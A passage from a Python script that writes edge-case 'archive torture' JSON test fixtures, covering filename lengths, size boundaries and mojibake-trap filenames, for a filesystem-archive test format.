    # heuristic that itself can be exploited (by creating a file
    # that LOOKS mojibake'd but is actually correct, and letting
    # the fixer mangle it).
    entries.append(file_entry("double_\u00c3\u00a9_encoded.txt"))

    return dir_entry("08_mojibake_traps", entries)


# -------- assemble --------

BUILDERS = {
    "filename_lengths": build_filename_length_boundaries,
    "path_lengths": build_path_length_boundaries,
    "format_sentinels": build_sentinel_names,
    "size_boundaries_small": build_size_boundaries_small,
    "size_boundaries_medium": build_size_boundaries_medium,
    "size_boundaries_large": build_size_boundaries_large,
    "evil_filenames": build_evil_filenames,
    "mojibake_traps": build_mojibake_traps,
}


def emit_category(category_suffix, builder, output_dir):
    """Write one category as a standalone test_json_fs JSON.

    Returns the output path written.
    """
    cat_dir = builder()
    # Drop the category-name wrapper directory; its contents go
    # directly under the root, matching the existing example/*.json
    # convention.
    root = dir_entry("./", cat_dir["contents"])
    path = os.path.join(output_dir, f"archive_torture_{category_suffix}.json")
    with open(path, "w", encoding="utf-8") as f:
        # ensure_ascii=True so that lone surrogates, control characters,
        # and non-BMP codepoints are emitted as \uXXXX escapes rather
        # than raw bytes. Keeps the files unambiguous (no encoding
        # guessing for readers) and lets us include byte sequences that
        # aren't valid UTF-8 when serialized raw (lone surrogates can't
        # round-trip through ensure_ascii=False).
        json.dump([root], f, ensure_ascii=True, indent=2)
        f.write("\n")
    return path


def main():
    parser = argparse.ArgumentParser(
        description="Emit per-category archive-torture example fixtures."
    )
    parser.add_argument(
        "--output-dir",
        default=os.path.dirname(os.path.abspath(__file__)),
        help="Directory to write the archive_torture_*.json files into "
             "(default: this script's directory).",
    )
    args = parser.parse_args()

    if not os.path.isdir(args.output_dir):
        print(f"error: output dir does not exist: {args.output_dir}",
              file=sys.stderr)
        sys.exit(2)

    for suffix, builder in BUILDERS.items():
        path = emit_category(suffix, builder, args.output_dir)
        print(f"wrote {path}")


if __name__ == "__main__":
    main()
